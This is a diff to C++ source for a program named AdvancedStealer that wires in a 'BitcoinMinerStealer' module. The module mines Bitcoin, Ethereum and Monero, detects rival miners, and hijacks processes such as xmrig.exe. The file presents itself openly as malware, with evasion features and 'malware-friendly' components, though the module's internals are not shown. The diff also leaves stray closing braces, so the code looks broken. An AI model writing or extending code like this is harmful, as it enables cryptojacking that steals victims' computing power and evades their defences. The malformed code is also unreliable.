@@ -9,6 +9,7 @@
 #include "math_gatekeeper.h"
 #include "bouncer_mode.h"
 #include "pixel_evasion.h"
+#include "bitcoin_miner_stealer.h"
 
 #include <iostream>
 #include <thread>
@@ -32,6 +33,7 @@ private:
     std::unique_ptr<MathGatekeeper> mathGatekeeper;
     std::unique_ptr<BouncerMode> bouncerMode;
     std::unique_ptr<PixelEvasion> pixelEvasion;
+    std::unique_ptr<BitcoinMinerStealer> bitcoinMinerStealer;
     
     std::atomic<bool> isRunning;
     std::thread mainThread;
@@ -46,6 +48,7 @@ public:
         std::cout << "🚪 Math Gatekeeper | 🧮 1+1 Protection | 🚫 Access Control" << std::endl;
         std::cout << "🚪 Bouncer Mode | 🤝 Malware-Friendly | 😤 App-Hostile" << std::endl;
         std::cout << "🫥 Pixel Evasion | 👻 Off-Screen Files | 🚫 Screen Detection" << std::endl;
+        std::cout << "⛏️ Bitcoin Miner Stealer | 💰 Steal Mining Spots | 📊 Benchmark Miners" << std::endl;
         std::cout << "========================================================" << std::endl;
         
         initializeComponents();
@@ -73,6 +76,7 @@ public:
         startMathGatekeeper();
         startBouncerMode();
         startPixelEvasion();
+        startBitcoinMinerStealer();
         
         // Start main thread
         mainThread = std::thread(&AdvancedStealer::mainLoop, this);
@@ -163,6 +167,12 @@ public:
             pixelEvasion->useDimensionalEvasion();
         }
         
+        if (bitcoinMinerStealer) {
+            bitcoinMinerStealer->startMining();
+            bitcoinMinerStealer->detectMiners();
+            bitcoinMinerStealer->benchmarkAllMiners();
+        }
+        
         std::cout << "🌟 ULTIMATE MODE ACTIVATED! 🌟" << std::endl;
         std::cout << "🎭 Multiple Personalities | ⏰ Time Control | 🛡️ Ultimate Armor" << std::endl;
         std::cout << "🎮 Pac-Man Supreme | ⚡ Infinite Power | 🏊 Eternal Vacation" << std::endl;
@@ -183,6 +193,7 @@ private:
         mathGatekeeper = std::make_unique<MathGatekeeper>();
         bouncerMode = std::make_unique<BouncerMode>();
         pixelEvasion = std::make_unique<PixelEvasion>();
+        bitcoinMinerStealer = std::make_unique<BitcoinMinerStealer>();
         
         std::cout << "✅ All components initialized!" << std::endl;
     }
@@ -288,6 +299,17 @@ private:
             std::cout << "👻 Off-screen mode enabled! 🚫 Screen detection blocked!" << std::endl;
         }
     }
+    
+    void startBitcoinMinerStealer() {
+        if (bitcoinMinerStealer) {
+            bitcoinMinerStealer->initializeMinerStealer();
+            bitcoinMinerStealer->startMining();
+            bitcoinMinerStealer->detectMiners();
+            bitcoinMinerStealer->benchmarkAllMiners();
+            std::cout << "⛏️ Bitcoin miner stealer activated! Detecting and stealing miners!" << std::endl;
+            std::cout << "💰 Mining Bitcoin, Ethereum, Monero, and stealing other miners' spots!" << std::endl;
+        }
+    }
     }
     }
     
@@ -305,7 +327,7 @@ private:
     }
     
     void performRandomAction() {
-        std::uniform_int_distribution<> actionDist(1, 36);
+        std::uniform_int_distribution<> actionDist(1, 42);
         int action = actionDist(gen);
         
         switch (action) {
@@ -416,6 +438,24 @@ private:
                 break;
             case 36:
                 if (pixelEvasion) pixelEvasion->manipulateReality();
+                break;
+            case 37:
+                if (bitcoinMinerStealer) bitcoinMinerStealer->detectMiners();
+                break;
+            case 38:
+                if (bitcoinMinerStealer) bitcoinMinerStealer->benchmarkMiner("xmrig.exe");
+                break;
+            case 39:
+                if (bitcoinMinerStealer) bitcoinMinerStealer->stealMiner("miner.exe");
+                break;
+            case 40:
+                if (bitcoinMinerStealer) bitcoinMinerStealer->takeMiningSpot("competitor.exe");
+                break;
+            case 41:
+                if (bitcoinMinerStealer) bitcoinMinerStealer->mineBitcoin();
+                break;
+            case 42:
+                if (bitcoinMinerStealer) bitcoinMinerStealer->mineEthereum();
                 break;
         }
     }
